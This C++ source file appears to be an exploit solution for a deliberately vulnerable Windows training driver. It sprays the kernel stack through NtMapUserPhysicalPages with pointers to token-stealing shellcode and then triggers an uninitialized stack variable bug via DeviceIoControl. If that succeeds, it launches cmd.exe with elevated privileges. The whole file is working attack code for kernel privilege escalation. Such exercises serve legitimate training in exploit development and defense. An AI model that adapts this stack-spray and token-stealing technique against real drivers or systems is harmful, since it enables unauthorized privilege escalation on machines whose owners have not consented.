#include <Windows.h>
#include <iostream>

#include "Solutions.h"
#include "utils.h"
#include "UninitializedStackVariable.h"

NTSTATUS Solutions::TriggerUninitializedStackVariable() {
	SIZE_T dwBufSize = sizeof(ULONG_PTR) * 1024;
	LPVOID lpInBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);
	DWORD dwBytesReturned = 0;

	 pNtMapUserPhysicalPages NtMapUserPhysicalPages = (pNtMapUserPhysicalPages)GetProcAddress(GetModuleHandleA("ntdll.dll"),
		"NtMapUserPhysicalPages");
	 if (!NtMapUserPhysicalPages) {
		 std::cout << "[-] could not find NtMapUserPhysicalPages - " << GetLastError() << std::endl;
		 return STATUS_DLL_NOT_FOUND;
	 }

	 if (!lpInBuffer) {
		 std::cout << "[-] could not allocate buffer" << std::endl;
		 return STATUS_NO_MEMORY;
	 }
	 for (int i = 0; i < 1024; i++) {
		 *(PULONG)((PULONG)lpInBuffer + i) = (ULONG)(&token_stealing_shellcode_write_what_where);
	 }

	 // the function will fail because of the NULL parameter but the buffer will allready be allocated
	 NtMapUserPhysicalPages(NULL, 1024, (PULONG)lpInBuffer);

	 std::cout << "[+] Trigger vulnerability" << std::endl;
	if (!DeviceIoControl(_hDeviceHandle, IOCTL_UNINTIALIZED_STACK_VARIABLE, lpInBuffer, dwBufSize,
		NULL, NULL, &dwBytesReturned, NULL)) {
		std::cout << "[-] Unable to talk with the driver" << std::endl;
		return STATUS_INVALID_PARAMETER;
	}

	system("cmd.exe");

	return 0;
}